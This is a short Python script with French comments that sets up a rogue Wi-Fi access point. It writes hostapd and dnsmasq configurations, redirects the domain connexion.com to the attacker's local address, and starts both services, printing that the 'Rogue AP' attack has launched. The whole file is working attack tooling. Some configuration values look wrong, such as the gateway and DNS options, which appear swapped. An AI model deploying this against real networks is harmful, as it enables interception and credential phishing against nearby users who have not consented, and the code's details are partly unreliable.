import os


#echo 1 > /proc/sys/net/ipv4/ip_forward


# Création du fichier de configuration Hostapd
def create_hostapd_conf(interface, channel, essid):
    config_content = f"""
    interface={interface}
    driver=nl80211
    ssid={essid}
    channel={channel}
    hw_mode=g
    macaddr_acl=0
    auth_algs=0
    ignore_broadcast_ssid=0
    wpa=2
    wpa_key_mgmt=WPA-PSK
    wpa_pairwise=TKIP CCMP
    rsn_pairwise=CCMP
    """
    with open("RogueAP/hostapd.conf", "w") as config_file:
        config_file.write(config_content)
        

# Création du fichier de configuration Dnsmasq
def create_dnsmasq_conf(interface):
    config_content = f"""
    interface={interface}
    dhcp-range=192.168.1.20,192.168.1.80,12h
    dhcp-option=3,8.8.8.8
    dhcp-option=6,192.168.1.1
    address=/connexion.com/192.168.1.1
    """
    with open("RogueAP/dnsmasq.conf", "w") as config_file:
        config_file.write(config_content)


# Lancer les 2 services Hostapd et Dnsmasq
def launch_rogue_ap():
    os.system("sudo systemctl start hostapd")
    os.system("sudo systemctl start dnsmasq")
    print("[SUCCESS] : L'attaque Rogue AP a été lancée avec succès.")


# Configuration du Rogue AP        
def setup_rogue_ap(interface, channel, essid):
    create_hostapd_conf(interface, channel, essid)
    create_dnsmasq_conf(interface)
    launch_rogue_ap()
    
    

# Test de la fonction setup_rogue_ap
if __name__ == "__main__":
    setup_rogue_ap("wlan0", 6, "TestWifiProject")